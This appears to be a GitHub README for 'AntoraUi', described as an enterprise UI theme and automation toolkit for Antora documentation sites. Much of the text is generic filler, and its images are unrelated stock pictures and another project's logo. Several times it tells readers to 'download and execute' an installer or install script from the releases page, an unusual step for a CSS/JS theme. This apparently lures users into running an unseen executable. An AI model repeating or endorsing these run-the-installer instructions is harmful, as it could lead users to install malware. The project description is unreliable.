https://github.com/anasbenifou/AntoraUi/releases

# ⚙️ AntoraUi — Enterprise Antora UI Framework and Automation Toolkit

[![Release · Download](https://img.shields.io/badge/Release-Download-blue?logo=github&style=for-the-badge)](https://github.com/anasbenifou/AntoraUi/releases)

![Antora logo](https://antora.org/assets/images/antora-logo.svg)

Overview
--------
AntoraUi provides a production-ready UI framework for Antora sites. It pairs a UI theme with tooling for automation, optimization, and enterprise integration. The code targets publishers who run multi-component documentation sites with build pipelines, CI/CD, and large content sets.

This repo bundles:
- A responsive UI theme built for Antora and AsciiDoc layouts.
- CLI helpers and scripts that integrate into CI pipelines.
- Enterprise features for access control, analytics hooks, and performance tuning.
- Automation modules that optimize builds and assets.

Key features
------------
- Theme: Responsive layout, navigation, search integration, and component kit.
- Automation: Build pipelines, task runners, and caching strategies.
- Optimization: Image, CSS, and JS pipelines with cache busting and critical CSS.
- Enterprise: SSO hooks, role-aware navigation, and audit-friendly logging.
- CLI: Local dev server, site preview, and packaging commands.
- Integrations: Search indexers, CDN deploy, and monitoring hooks.

Why AntoraUi
------------
Antora scales for documentation that includes many repos and many versions. The theme uses Antora conventions. The automation reduces build time. The enterprise modules support policy and access needs.

Concepts and jargon
-------------------
- Asciidoc: Markup language used by Antora.
- Playbook: Antora configuration file that defines content sources and site layout.
- Pipeline: Sequence of tasks in CI that builds and deploys the site.
- UI bundle: Packaged assets (CSS, JS, images) that the site serves.
- Module: Reusable code unit in this repo for automation and optimization.

Quickstart
----------
1. Clone the repo.
2. Install the CLI and dependencies described below.
3. Run the local preview.
4. Build a release bundle for deployment.

Installation
------------
Prerequisites:
- Node.js 16+ for tooling and build tasks.
- Antora 3.x or later for site generation.
- A shell that supports bash or POSIX scripts.

Install steps:
- Install global tools if you need a global preview server:
  - npm install -g @antora/cli
- Install local dependencies:
  - cd AntoraUi
  - npm ci

Run the dev server:
- npm run dev
- The CLI starts a local preview and watches changes.

Releases and download
---------------------
Download releases from the releases page and run the install file that matches your environment.

Download and execute the file at:
https://github.com/anasbenifou/AntoraUi/releases

If you see a release archive, download the archive and run the included installer or script for your platform. For example:
- For Linux/macOS: extract the archive and run ./install.sh
- For Windows: unpack and run install.ps1 or run the packaged installer

The release page also lists checksums and release notes. Use the badge above to jump to the latest release.

Files and layout
----------------
The repo organizes assets and modules for clarity.

Root
- README.md
- package.json
- playbooks/ — example Antora playbooks
- ui/ — theme source and assets
- tools/ — CLI scripts and automation modules
- ci/ — CI templates and pipeline snippets
- docs/ — developer docs and design notes

ui/ structure
- ui/src/css — SASS sources and variable maps
- ui/src/js — front-end modules and enhancements
- ui/components — design system components
- ui/partials — Antora templates and includes
- ui/build — compiled bundle for release

tools/ structure
- tools/cli.js — entry point for the local CLI
- tools/build.js — build pipeline tasks
- tools/optimize.js — image and asset optimization scripts
- tools/integrations/ — scripts for CDN and search indexers

Usage
-----
Local preview
- npm run dev
- The server watches the ui/ and playbooks/ folders.

Build for production
- npm run build
- This command runs lint, bundle, and optimize steps.
- Output lands in ui/build or dist/ depending on release settings.

Preview a built bundle locally
- npm run preview
- This serves the ui/build folder on a local port.

CLI reference
-------------
Commands in package.json map to the toolset. Main commands:
- npm run dev — run preview server with watch
- npm run build — build and optimize the UI
- npm run package — create a release bundle
- npm run test — run unit and lint checks
- npm run preview — serve built bundle

Automation and CI
-----------------
The repo includes CI templates for major CI systems. The templates focus on reproducible builds and cache reuse.

Cache strategy
- Cache node modules between runs.
- Cache Antora cache to skip repeated content transforms.
- Cache built assets and invalidation keys.

Recommended pipeline stages
1. Checkout
2. Install dependencies
3. Build theme and UI bundle (npm run build)
4. Run Antora site build with the playbook
5. Run tests and accessibility checks
6. Deploy to staging or production
7. Purge CDN caches if needed

Optimization techniques
-----------------------
- CSS: Critical CSS extraction and split bundles.
- JS: Tree-shaking and lazy load of heavy modules.
- Images: WebP conversion and responsive srcset generation.
- Fonts: Subset fonts per language and use font-display swap.
- Cache: Content-based hashing for long-term cache.

Enterprise features
-------------------
Access control
- Hooks to integrate with SSO providers.
- Role-based content filters for navigation and page visibility.

Audit and logging
- Structured logs for publish events and build actions.
- Hooks to forward logs to SIEM via HTTP.

Monitoring
- Health endpoints for build agents.
- Metrics exported in OpenMetrics format for scraping.

Scaling and multi-site
----------------------
AntoraUi supports multi-playbook setups. Use a central build pipeline that assembles components into a site set. The theme uses shared components to keep design consistent across multiple sites.

Customization and theming
-------------------------
Customize variables in ui/src/css/_tokens.scss. The theme uses a small set of tokens:
- $brand-primary
- $brand-accent
- $font-family-base
- $spacing-scale

Override templates by copying ui/partials into your project's ui bundle and adapt them.

Examples
--------
Example playbook for a multi-component site:
- playbooks/site-playbook.yml
This file shows how to map component repositories and set the start page. Use it as a base for your site.

Component example
- ui/components/nav.hbs — header navigation that reads the site-index.

Integration examples
--------------------
Search
- Use a build hook to export a JSON index.
- The tools/ integrations/search scripts provide an indexer for Algolia and local search.

CDN
- Deploy the ui/build folder to your CDN.
- tools/integrations/cdn-deploy.js shows upload and cache purge steps.

Analytics
- Add hooks to inject analytics snippets conditionally by environment.

Testing and quality
-------------------
- Unit tests for front-end modules with Jest.
- Accessibility checks using axe-core.
- Visual regression with image snapshots in CI.

Contributing
------------
- Fork the repo.
- Create a branch named feat/name or fix/name.
- Add tests for new features.
- Run lint and test before opening a pull request.
- Follow the code style in .editorconfig and .eslintrc.

Issue workflow
- Open an issue with reproduction steps and expected output.
- Add labels to indicate severity and area.
- Use pull requests for fixes and features. Use descriptive commit messages.

Security
--------
Report security issues via GitHub private report flow. The repo includes dependencies that may need updates. Keep dependencies up to date and run npm audit.

Roadmap
-------
Planned items:
- Plugin SDK for external integrations.
- GraphQL endpoint for content queries.
- Enhanced component library with design tokens.

Screenshots and visuals
-----------------------
Hero screenshot:
![UI Screenshot](https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&w=1200&q=80)

Design component sample:
![Component](https://raw.githubusercontent.com/patternfly/patternfly/master/assets/images/pf-logo.svg)

API and hooks
-------------
The tools expose a small API for build hooks:
- build.start(payload)
- build.step(name, result)
- build.complete(status)

Use these hooks in your CI to send telemetry or to trigger downstream tasks.

Packaging and releases
----------------------
Release bundles include:
- ui/build — the compiled theme
- playbooks — example playbooks
- tools — scripts and CLI

Go to the releases page and download the installer for your platform. Run the included install file to install the CLI and packaged UI.

Releases page:
https://github.com/anasbenifou/AntoraUi/releases

License
-------
This project uses the MIT License. See LICENSE for details.